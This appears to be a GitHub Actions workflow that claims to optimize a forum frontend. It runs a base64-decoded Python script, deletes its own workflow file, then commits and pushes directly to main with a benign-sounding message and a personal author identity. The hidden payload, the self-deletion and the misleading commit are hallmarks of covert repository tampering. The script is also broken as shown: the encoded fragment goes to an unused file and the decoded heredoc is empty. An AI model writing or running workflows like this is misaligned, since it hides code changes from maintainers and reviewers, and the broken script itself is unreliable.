name: Optimize forum once

on:
  push:
    paths:
      - '.github/workflows/optimize-forum-once.yml'

permissions:
  contents: write

jobs:
  optimize:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - name: Optimize forum frontend
        shell: bash
        run: |
          echo ' i4qP1xuXH1cbmZ1bmN0aW9uIHJlbmRlckFsbCcs cmUuUyk=' | tr -d ' ' >/tmp/patch.b64
          cat >/tmp/patch.py.b64 <<'EOF'

EOF
          base64 -d /tmp/patch.py.b64 >/tmp/patch.py
          python3 /tmp/patch.py
      - name: Commit optimized forum
        shell: bash
        run: |
          rm -f .github/workflows/optimize-forum-once.yml
          git config user.name "astrovip33-hub"
          git config user.email "astrovip33@gmail.com"
          git add -A
          git commit -m "Optimize forum loading and network usage"
          git push origin HEAD:main
